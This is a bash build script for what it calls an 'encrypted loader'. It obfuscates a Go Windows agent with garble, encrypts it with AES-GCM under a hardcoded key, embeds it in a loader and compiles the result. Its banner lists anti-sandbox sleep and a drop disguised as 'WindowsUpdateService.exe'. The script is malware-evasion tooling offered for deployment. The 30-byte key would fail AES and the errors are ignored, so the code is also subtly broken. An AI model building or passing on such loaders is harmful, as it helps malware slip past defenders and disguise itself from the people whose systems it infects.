#!/bin/bash

set -e

echo "============================================="
echo " ENCRYPTED LOADER BUILDER"
echo "============================================="
echo ""

# Créer le dossier de build
mkdir -p build/windows

# 1. Compiler l'agent avec garble
echo "[1/4] Compiling agent with garble obfuscation..."
GOOS=windows GOARCH=amd64 garble -tiny -literals -seed=random build -o build/windows/agent_obfuscated.exe ./cmd/agent 2>&1 | grep -v "chosen at random" || true
echo "      [+] Agent obfuscated ($(ls -lh build/windows/agent_obfuscated.exe | awk '{print $5}'))"

# 2. Chiffrer l'agent avec notre script Go
echo "[2/4] Encrypting agent with AES-256-GCM..."

cat > /tmp/encrypt_agent.go << 'ENCRYPT_EOF'
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"os"
)

func main() {
	// Lire l'agent
	plaintext, _ := os.ReadFile("build/windows/agent_obfuscated.exe")
	
	// Clé AES
	key := []byte("SuperSecretKey1234567890123456")
	
	// Chiffrer
	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	
	nonce := make([]byte, gcm.NonceSize())
	io.ReadFull(rand.Reader, nonce)
	
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	
	// Encoder en base64
	encoded := base64.StdEncoding.EncodeToString(ciphertext)
	
	fmt.Print(encoded)
}
ENCRYPT_EOF

ENCRYPTED=$(go run /tmp/encrypt_agent.go)
echo "      [+] Agent encrypted (${#ENCRYPTED} chars base64)"

# 3. Injecter dans le loader
echo "[3/4] Injecting encrypted payload into loader..."
sed "s|PLACEHOLDER|$ENCRYPTED|g" cmd/loader/main.go > /tmp/loader_with_payload.go
echo "      [+] Payload injected"

# 4. Compiler le loader (avec garble aussi)
echo "[4/4] Compiling final loader with obfuscation..."
mkdir -p /tmp/loader_build
cp /tmp/loader_with_payload.go /tmp/loader_build/main.go

cat > /tmp/loader_build/go.mod << 'MODEOF'
module loader

go 1.21
MODEOF

cd /tmp/loader_build
GOOS=windows GOARCH=amd64 garble -tiny -literals -seed=random build -o loader.exe . 2>&1 | grep -v "chosen at random" || true

# Copier le résultat
cp /tmp/loader_build/loader.exe "$OLDPWD/build/windows/loader_encrypted.exe"
cd "$OLDPWD"

SIZE=$(ls -lh build/windows/loader_encrypted.exe | awk '{print $5}')
echo "      [+] Final loader compiled ($SIZE)"

echo ""
echo "============================================="
echo " BUILD COMPLETE!"
echo "============================================="
echo ""
echo "Files generated:"
echo "  - build/windows/agent_obfuscated.exe     (garble obfuscated)"
echo "  - build/windows/loader_encrypted.exe     (final encrypted loader)"
echo ""
echo "Deploy: build/windows/loader_encrypted.exe"
echo ""
echo "Features:"
echo "  [+] Code obfuscated with garble"
echo "  [+] Agent encrypted with AES-256-GCM"
echo "  [+] Anti-sandbox sleep (10s)"
echo "  [+] Drops as 'WindowsUpdateService.exe'"
echo ""
echo "============================================="

# Cleanup
rm -f /tmp/encrypt_agent.go
rm -rf /tmp/loader_build
